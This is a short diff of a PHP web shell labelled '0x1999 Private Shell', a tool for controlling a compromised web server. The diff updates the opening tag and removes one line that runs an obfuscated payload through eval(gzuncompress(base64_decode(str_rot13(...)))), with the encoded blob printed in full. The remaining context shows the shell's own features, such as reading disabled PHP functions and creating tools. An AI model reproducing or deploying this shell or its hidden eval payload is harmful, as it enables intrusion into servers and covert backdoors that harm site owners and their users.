@@ -1,4 +1,4 @@
-<?
+<?php
 // 0x1999 Private Shell
 // Use your own risk
 // Hard coded by 0x1999
@@ -353,8 +353,7 @@ $dir = str_replace("\\","/",$dir);
 $scdir = explode("/", $dir);
 $ds = @ini_get("disable_functions");
 $show_ds = (!empty($ds)) ? "<input type='text' name='searchterm' size='30'style='background-color: rgb(41, 41, 41);border: 1px solid rgb(41, 41, 41);height: 12px;color: red;width: 385px;'value='$ds'readonly/>" : "<font color=lime>NONE</font>"; 
-echo "<title>$shell_name</title>"; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
-
+echo "<title>$shell_name</title>";
 if(isset($_GET['create'])){
 	function CreateTools($names,$lokasi){
 	if ( $_GET['create'] == $names ){
@@ -2287,4 +2286,3 @@ function LastModified($file){
 }
 @ob_flush();		
 ?>
-
